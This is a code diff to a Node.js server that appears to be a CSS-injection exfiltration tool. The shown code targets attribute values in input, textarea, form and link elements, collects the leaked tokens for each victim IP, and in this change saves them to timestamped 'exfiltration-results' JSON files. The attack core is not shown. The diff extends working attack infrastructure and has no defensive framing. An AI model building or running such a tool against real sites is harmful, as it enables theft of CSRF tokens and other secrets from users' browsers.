@@ -1,16 +1,25 @@
 const connect = require('connect');
 const http = require('http');
 const url = require('url');
-const port = 5001;
+const fs = require('fs');
+const path = require('path');
 
-const HOSTNAME = "http://localhost:5001";
-const ELEMENTS = ["input","textarea","form","a"];
-const ATTRIBUTES = {__proto__:null,"input":["value","name"],"textarea":["name"],"form":["action"],"a":["href"]};
+const HOSTNAME = process.env.HOSTNAME || "http://localhost:5001";
+
+const ATTRIBUTES = process.env.ATTRIBUTES ? JSON.parse(process.env.ATTRIBUTES) : {
+    "input": ["value", "name"],
+    "textarea": ["name"],
+    "form": ["action"],
+    "a": ["href"]
+};
+
+const ELEMENTS = Object.keys(ATTRIBUTES).filter(key => key !== '__proto__');
+
 const MAX_ELEMENTS = 20;
 const MAX_VALUE = 200;
 const WAIT_TIME_MS = 500;
 const MAX_SESSION_AMOUNT = 1000;
-const SHOW_RESULTS_IN_BROWSER = true;
+const SHOW_RESULTS_IN_BROWSER = process.env.SHOW_RESULTS_IN_BROWSER === 'true';
 const SHOW_RESULTS_IN_CONSOLE = true;
 
 const LOWER_LETTERS = "abcdefghijklmnopqrstuvwxyz";
@@ -177,11 +186,11 @@ const genResponse = (request, response, elementNumber) => {
     response.end();
 };
 
-const server = http.createServer(app).listen(port, (err) => {
+const server = http.createServer(app).listen(5001, (err) => {
     if (err) {
         return console.log('[-] Error: something bad happened', err);
     }
-    console.log('[+] Server is listening on %d', port);
+    console.log('[+] Server is listening on 5001');
 });
 
 function escapeCSS(str) {
@@ -237,11 +246,26 @@ function htmlBeforeCSS(text, important) {
     }`;
 }
 
+function writeResultsToFile(tokens) {
+    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+    const filename = path.join('/data', `exfiltration-results-${timestamp}.json`);
+    const data = JSON.stringify(tokens, null, 2);
+    
+    fs.writeFile(filename, data, (err) => {
+        if (err) {
+            console.error('Error writing results to file:', err);
+        } else {
+            console.log(`Results written to ${filename}`);
+        }
+    });
+}
+
 function completed(request, response) {
     const ip = getIP(request);
     const tokens = session.get(ip).get('tokens',true);
     if(SHOW_RESULTS_IN_CONSOLE) {
         console.log("Completed.", tokens);
+        writeResultsToFile(tokens);
     }
     if(!SHOW_RESULTS_IN_BROWSER) {
         response.end();
